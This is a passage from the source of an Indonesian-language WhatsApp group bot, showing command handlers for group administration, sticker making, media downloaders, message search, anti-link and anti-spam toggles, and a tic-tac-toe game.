						sendFileFromUrl(dl_link, document, {mimetype: 'audio/mp3', filename: `${title}.mp3`, quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title:title,body:"",mediaType:"2",thumbnail:getBuffer(thumb),mediaUrl:`${body.slice(7)}`}}}).catch(() => reply('ERROR'))
					})
				})
			} catch (err) {
				reply('ERROR')
			}
			break
		case 'demote':
			if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins) return reply(mess.only.admin)
			if (!isBotGroupAdmins) return 
			if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Reply targetnya!')
			demote = mek.message.extendedTextMessage.contextInfo.participant
			client.groupDemoteAdmin(from, [demote])
			reply('Sukses demote admin')
			break
		case 'promote':
			if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins) return reply(mess.only.admin)
			if (!isBotGroupAdmins) return
			if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Reply targetnya!')
			promote = mek.message.extendedTextMessage.contextInfo.participant
			client.groupMakeAdmin(from, [promote])
			reply('Sukses promote member')
			break
		case 'linkgrup': case 'linkgroup': case 'linkgc':
			if (!isGroup) return reply(mess.only.group)
			if (!isBotGroupAdmins) return 
			linkgc = await client.groupInviteCode(from)
			yeh = `https://chat.whatsapp.com/${linkgc}\n\nLink grup ${groupName}`
			client.sendMessage(from, yeh, text, { quoted: mek })
			break
		case 'resetlinkgc': case 'resetlinkgroup': case 'revoke':
			if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins) return reply(mess.only.admin)
			if (!isBotGroupAdmins) return 
			json = ['action', 'inviteReset', from]
			client.query({json, expect200: true})
			reply('Sukses Mereset Link Group')
			break
		case 'opengc':
			if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins) return reply(mess.only.admin)
			if (!isBotGroupAdmins) return 
			reply(`Sukses membuka grup ${groupName}`)
			client.groupSettingChange(from, GroupSettingChange.messageSend, false)
			break
		case 'closegc':
			if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins) return reply(mess.only.admin)
			if (!isBotGroupAdmins) return 
			reply(`Sukses menutup grup ${groupName}`)
			client.groupSettingChange(from, GroupSettingChange.messageSend, true)
			break
		case 'sticker': case 'stiker': case 'sg': case 's':
			if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
				const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
				const media = await client.downloadAndSaveMediaMessage(encmedia)
				ran = '666.webp'
				await ffmpeg(`./${media}`)
				.input(media)
				.on('start', function (cmd) {
					console.log(`Started : ${cmd}`)
				})
				.on('error', function (err) {
					console.log(`Error : ${err}`)
					fs.unlinkSync(media)
					reply('error')
				})
				.on('end', function () {
					console.log('Finish')
					client.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: finv})
					fs.unlinkSync(media)
					fs.unlinkSync(ran)
				})
				.addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
				.toFormat('webp')
				.save(ran)
			} else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
				const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
				const media = await client.downloadAndSaveMediaMessage(encmedia)
				ran = '999.webp'
				reply(mess.wait)
				await ffmpeg(`./${media}`)
				.inputFormat(media.split('.')[1])
				.on('start', function (cmd) {
					console.log(`Started : ${cmd}`)
				})
				.on('error', function (err) {
					console.log(`Error : ${err}`)
					fs.unlinkSync(media)
					tipe = media.endsWith('.mp4') ? 'video' : 'gif'
					reply(`Gagal, pada saat mengkonversi ${tipe} ke stiker`)
				})
				.on('end', function () {
					console.log('Finish')
					client.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: finv})
					fs.unlinkSync(media)
					fs.unlinkSync(ran)
				})
				.addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
				.toFormat('webp')
				.save(ran)
			} else {
				reply(`Kirim gambar dengan caption ${prefix}sticker\nDurasi Sticker Video 1-9 Detik`)
			}
			break
		case 'githubstalk':
			if (args.length < 1) return reply('Usernamenya?')
			var teks = body.slice(13)
			anu = await fetchJson(`https://yuzzu-api.herokuapp.com/api/github/stalk?username=${teks}`, {method: 'get'})
			gstalk = `GITHUB STALK\n\nName : ${anu.result.user.username}\nFollowers : ${anu.result.user.followers}\nFollowing : ${anu.result.user.following}\nId : ${anu.result.user.idUser}\nNode Id : ${anu.result.user.nodeId}\nType : ${anu.result.user.type}\nCompany : ${anu.result.user.company}\nBio : ${anu.result.user.bio}\nSite Admin : ${anu.result.user.isSiteAdmin}\nEmail : ${anu.result.user.email}\nCreated At : ${anu.result.user.createdAt}\nUpdated At : ${anu.result.user.updatedAt}\nBlog : ${anu.result.user.blog}\nAvatar Url : ${anu.result.user.avatarUrl}\nGravatar Id : ${anu.result.user.gravatarId}\nHtml Url : ${anu.result.user.githubUrl}`
			reply(mess.wait)
			buff = await getBuffer(anu.result.user.avatarUrl)
			client.sendMessage(from, buff, image, {quoted: finv, caption: gstalk})
			break
		case 'readmore': case 'more':
			if (args.length < 1) return reply(`kirim perintah ${prefix}readmore text1|text2`)
			const more = String.fromCharCode(8206)
			const readmore = more.repeat(4001)
			if (!q.includes('|')) return  reply(mess.error.api)
			const text1 = q.substring(0, q.indexOf('|') - 0)
			const text2 = q.substring(q.lastIndexOf('|') + 1)
			reply( text1 + readmore + text2)
			break
		case 'detikvn':
			encmediam = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
			mediam = await client.downloadAndSaveMediaMessage(encmediam)
			cokmatane = Number(args[0])
			hah = fs.readFileSync(mediam)
			client.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: cokmatane, ptt: true, quoted:finv})
			fs.unlinkSync(mediam)
			break	
		case 'detikvideo':
			encmedian = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
			median = await client.downloadAndSaveMediaMessage(encmedian)
			cokmatane = Number(args[0])
			hah = fs.readFileSync(median)
			client.sendMessage(from, hah, video, {mimetype: 'video/mp4', duration: cokmatane, quoted: finv})
			fs.unlinkSync(median)
			break
		case 'caripesan':
			if(!q)return reply('pesannya apa bang?')
			let v = await client.searchMessages(q,from,10,1)
			let s = v.messages
			let el = s.filter(v => v.message)
			el.shift()
			try {
				if(el[0].message.conversation == undefined) return
				reply(`Ditemukan ${el.length} pesan`)
				await sleep(3000)
				for(let i = 0; i < el.length; i++) {
					await client.sendMessage(from,'Nih pesannya',text,{quoted:el[i]})
				}	
			} catch(e){
				reply('Pesan tidak ditemukan!')
			}
			break
		case 'wiki':
			if (args.length < 1) return reply(' Yang Mau Di Cari Apa? ')
			teks = args.join(' ')
			res = await wikiSearch(teks).catch(e => {
				return reply('[ ! ] Error Hasil Tidak Ditemukan') 
			}) 
			result = `Judul : ${res[0].judul}\nWiki : ${res[0].wiki}`
			sendFileFromUrl(res[0].thumb, image, {quoted: mek, caption: result}).catch(e => {
				reply(result)
			})
			break
		case 'antilink':
			if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins) return reply(mess.only.admin)
			if (!isBotGroupAdmins) return
			if (args.length < 1) return reply(`untuk mengaktifkan ketik : ${prefix}antilink 1`)
			if (Number(args[0]) === 1) {
				if (isAntiLink) return reply('Sudah Aktif')
				antilink.push(from)
				fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
				reply('Sukses mengaktifkan fitur antilink')
				client.sendMessage(from, `ALLERT!!! Group ini sudah di pasang anti link\nJika Kamu Melanggar Maka Akan Saya Tendang`, text)
			} else if (Number(args[0]) === 0) {
				if (!isAntiLink) return reply('Sudah Mati')
				var ini = antilink.indexOf(from)
				antilink.splice(ini, 1)
				fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
				reply('Sukses menonaktifkan fitur antilink')
			} else {
				reply('1 untuk mengaktifkan, 0 untuk mematikan')
			}
			break
		case 'antivirtex':
			if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins) return reply(mess.only.admin)
			if (!isBotGroupAdmins) return
			if (args.length < 1) return reply(`untuk mengaktifkan ketik : ${prefix}antivirtex 1`)
			if (Number(args[0]) === 1) {
				if (isAntiVirtex) return reply('Sudah Aktif')
				antivirtex.push(from)
				fs.writeFileSync('./database/antivirtex.json', JSON.stringify(antivirtex))
				reply('Sukses mengaktifkan fitur antivirtex')
				client.sendMessage(from, `ALLERT!!! Group ini sudah di pasang anti virtex\nJika Kamu Melanggar Maka Akan Saya Tendang`, text)
			} else if (Number(args[0]) === 0) {
				if (!isAntiVirtex) return reply('Sudah Mati')
				var ini = antivirtex.indexOf(from)
				antivirtex.splice(ini, 1)
				fs.writeFileSync('./database/antivirtex.json', JSON.stringify(antivirtex))
				reply('Sukses menonaktifkan fitur antivirtex')
			} else {
				reply('1 untuk mengaktifkan, 0 untuk mematikan')
			}
			break
		case 'ig': case 'igdl': case 'instagram':
			if (!q) return reply('Linknya?')
			var { igDownloader } = require('./lib/igdown')
			res = await igDownloader(`${q}`).catch(e => {
				reply(mess.error.api)
			})
			console.log(res)
			sendMediaURL(from,`${res.result.link}`,`${res.result.desc}`)
			break
		case 'tiktok': case 'tiktokdl': case 'tiktoknowm':
			if (!q) return reply('Linknya?')
			var { TiktokDownloader } = require('./lib/tiktokdl')
			reply(mess.wait)
			res = await TiktokDownloader(`${q}`).catch(e => {
				reply(mess.error.api)
			})
			console.log(res)
			sendMediaURL(from, `${res.result.nowatermark}`)
			break
		case 'listgc': case 'gclist': case 'listgroup': case 'listgrup': case 'listgrop': case 'gruplist': case 'groplist': case 'grouplist':
			const txs = client.chats.all().filter(v => v.jid.endsWith('g.us')).map(v =>`- ${client.getName(v.jid)}\n${v.jid}\n[${v.read_only ? 'Left' : 'Joined'}]`).join`\n\n`
			reply(txs)
			break
		case 'tictactoe': case 'ttt':
				if (!isGroup) return reply(mess.only.group)
				if (args.length < 1) return reply('Tag Lawan Anda! ')
				if (isTTT) return reply('Sedang Ada Permainan Di Grub Ini, Harap Tunggu')
				if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target Lawan!')
				ment = mek.message.extendedTextMessage.contextInfo.mentionedJid
				player1 = sender
				player2 = ment[0]
				angka = ["0️⃣","1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"]
				id = from
				gilir = player2
				ky_ttt.push({player1,player2,id,angka,gilir})
				client.sendMessage(from, `🎳 Memulai Game Tictactoe 🎲\n\n[@${player2.split('@')[0]}] Menantang anda untuk menjadi lawan Game🔥\nKetik Y/N untuk menerima atau menolak permainan\n\nKetik ${prefix}delttc , Untuk Mereset Permainan Yg Ada Di Grup!`, text, {contextInfo: {mentionedJid: [player2]}})
			break
		case 'delttt': case 'delttc':
			if (!isGroup) return reply(mess.only.group)
			if (!isTTT) return reply('Tidak Ada Permainan Di Grub Ini')
			naa = ky_ttt.filter(toek => !toek.id.includes(from)) 
			ky_ttt = naa 
			reply('Sukses')
			break
			
			default:
			}

			if (isTTT && isPlayer2){
				if (budy.startsWith('Y')){
					tto = ky_ttt.filter(ghg => ghg.id.includes(from))
					tty = tto[0]
					angka = tto[0].angka
					ucapan = `🎳 Game Tictactoe 🎲\nPlayer1 @${tty.player1.split('@')[0]}=❌\nPlayer2 @${tty.player2.split('@')[0]}=⭕\n\n${angka[1]}${angka[2]}${angka[3]}\n${angka[4]}${angka[5]}${angka[6]}\n${angka[7]}${angka[8]}${angka[9]}\n\nGiliran = @${tty.player1.split('@')[0]}`
					client.sendMessage(from, ucapan, text, {quoted: finv, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
				}
				if (budy.startsWith('N')){
					tto = ky_ttt.filter(ghg => ghg.id.includes(from))
					tty = tto[0]
					naa = ky_ttt.filter(toek => !toek.id.includes(from)) 
					ky_ttt = naa
					client.sendMessage(from, `Yahh @${tty.player2.split('@')[0]} Menolak:(`,text,{quoted:finv,contextInfo:{mentionedJid:[tty.player2]}})
				}
			}
			if (isTTT && isPlayer1){
				nuber = parseInt(budy)
				if (isNaN(nuber)) return
				if (nuber < 1 || nuber > 9) return reply('Masukan Angka Dengan Benar')
				main = ky_ttt.filter(hjh => hjh.id.includes(from)) 
				if (!tttawal.includes(main[0].angka[nuber])) return reply('Udah Di Isi, Isi Yang Lain Gan')
				if (main[0].gilir.includes(sender)) return reply('Tunggu Giliran Gan')
				s = '❌'
				main[0].angka[nuber] = s
				main[0].gilir = main[0].player1
				naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
				ky_ttt = naa
				pop = main[0]
				ky_ttt.push(pop)
				tto = ky_ttt.filter(hgh => hgh.id.includes(from))
				tty = tto[0]
				angka = tto[0].angka
				ttt = `${angka[1]}${angka[2]}${angka[3]}\n${angka[4]}${angka[5]}${angka[6]}\n${angka[7]}${angka[8]}${angka[9]}`
				ucapmenang = () => {
					ucapan1 = `🎳Result Game Tictactoe 🎲\n\nYeyyy Permainan Di Menangkan Oleh @${tty.player1.split('@')[0]}\n`
					ucapan2 = `🎳Result Game Tictactoe 🎲\n\nHasil Akhir:\n\n${ttt}`
					client.sendMessage(from, ucapan1, text, {quoted:finv, contextInfo:{mentionedJid: [tty.player1]}})
					naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
					return ky_ttt = naa
				}
				if (angka[1] == s && angka[2] == s && angka[3] == s) return ucapmenang()
				if (angka[1] == s && angka[4] == s && angka[7] == s) return ucapmenang()
				if (angka[1] == s && angka[5] == s && angka[9] == s) return ucapmenang()
				if (angka[2] == s && angka[5] == s && angka[8] == s) return ucapmenang()
				if (angka[4] == s && angka[5] == s && angka[6] == s) return ucapmenang()
				if (angka[7] == s && angka[8] == s && angka[9] == s) return ucapmenang()
				if (angka[3] == s && angka[5] == s && angka[7] == s) return ucapmenang()
				if (angka[3] == s && angka[6] == s && angka[9] == s) return ucapmenang()

				if (!ttt.includes('1️⃣') && !ttt.includes('2️⃣') && !ttt.includes('3️⃣') && ! ttt.includes('4️⃣') && !
				ttt.includes('5️⃣') && !
				ttt.includes('6️⃣') && ! ttt.includes('7️⃣') && ! ttt.includes('8️⃣') && ! ttt.includes('9️⃣')){
					ucapan1 = `🎳 Result Game Tictactoe 🎲\n\n_Permainan Seri 🗿👌_`
					ucapan2 = `🎳 Result Game Tictactoe 🎲\n\nHasil Akhir:\n\n${ttt}`
					reply(ucapan1)
					naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
					return ky_ttt = naa
				}
				ucapan = `🎳 Game Tictactoe 🎲\n\nPlayer2 @${tty.player2.split('@')[0]}=⭕\nPlayer1 @${tty.player1.split('@')[0]}=❌\n\n${ttt}\n\nGiliran = @${tty.player2.split('@')[0]}`
				client.sendMessage(from, ucapan, text, {quoted: finv, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
			}
			if (isTTT && isPlayer2){
				nuber = parseInt(budy)
				if (isNaN(nuber)) return
				if (nuber < 1 || nuber > 9) return reply('Masukan Angka Dengan Benar')
				main = ky_ttt.filter(hjh => hjh.id.includes(from)) 
				if (!tttawal.includes(main[0].angka[nuber])) return reply('Udah Di Isi, Isi Yang Lain Gan')
				if (main[0].gilir.includes(sender)) return reply('Tunggu Giliran Gan')
				s = '⭕'
				main[0].angka[nuber] = s
				main[0].gilir = main[0].player2
				naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
				ky_ttt = naa
				pop = main[0]
				ky_ttt.push(pop)
				tto = ky_ttt.filter(hgh => hgh.id.includes(from))
				tty = tto[0]
				angka = tto[0].angka
				ttt = `${angka[1]}${angka[2]}${angka[3]}\n${angka[4]}${angka[5]}${angka[6]}\n${angka[7]}${angka[8]}${angka[9]}`
				ucapmenang = () => {
					ucapan1 = `🎳 Result Game Tictactoe 🎲\n\nYeyyy Permainan Di Menangkan Oleh @${tty.player2.split('@')[0]}\n`
					ucapan2 = `🎳 Game Tictactoe 🎲\n\nHasil Akhir:\n\n${ttt}`
					client.sendMessage(from, ucapan1, text, {quoted:finv, contextInfo:{mentionedJid: [tty.player2]}})
					naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
					return ky_ttt = naa
				}

				if (angka[1] == s && angka[2] == s && angka[3] == s) return ucapmenang()
				if (angka[1] == s && angka[4] == s && angka[7] == s) return ucapmenang()
				if (angka[1] == s && angka[5] == s && angka[9] == s) return ucapmenang()
				if (angka[2] == s && angka[5] == s && angka[8] == s) return ucapmenang()
				if (angka[4] == s && angka[5] == s && angka[6] == s) return ucapmenang()
				if (angka[7] == s && angka[8] == s && angka[9] == s) return ucapmenang()
				if (angka[3] == s && angka[5] == s && angka[7] == s) return ucapmenang()
				if (angka[3] == s && angka[6] == s && angka[9] == s) return ucapmenang()
				if (!ttt.includes('1️⃣') && !ttt.includes('2️⃣') && !ttt.includes('3️⃣') && ! ttt.includes('4️⃣') && !
				ttt.includes('5️⃣') && !
				ttt.includes('6️⃣') && ! ttt.includes('7️⃣') && ! ttt.includes('8️⃣') && ! ttt.includes('9️⃣')){
					ucapan1 = `🎳Result Game Tictactoe 🎲\n\n_Permainan Seri🗿👌`
					ucapan2 = `🎳 Result Game Tictactoe 🎲\n\nHasil Akhir:\n\n${ttt}`
					reply(ucapan1)
					naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
					return ky_ttt = naa
				}
				ucapan = `🎳 Game Tictactoe 🎲\n\nPlayer1 @${tty.player1.split('@')[0]}=⭕\nPlayer2 @${tty.player2.split('@')[0]}=❌\n\n${ttt}\n\niliran = @${tty.player1.split('@')[0]}`
				client.sendMessage(from, ucapan, text, {quoted: finv, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
			}

			if (isGroup && budy != undefined) {
			} else {
			}
		} catch (e) {
			e = String(e)
			if (!e.includes("this.isZero") && !e.includes("jid")) {
				console.log('Message : %s', color(e, 'green'))
			}
		}
	})
}
starts()
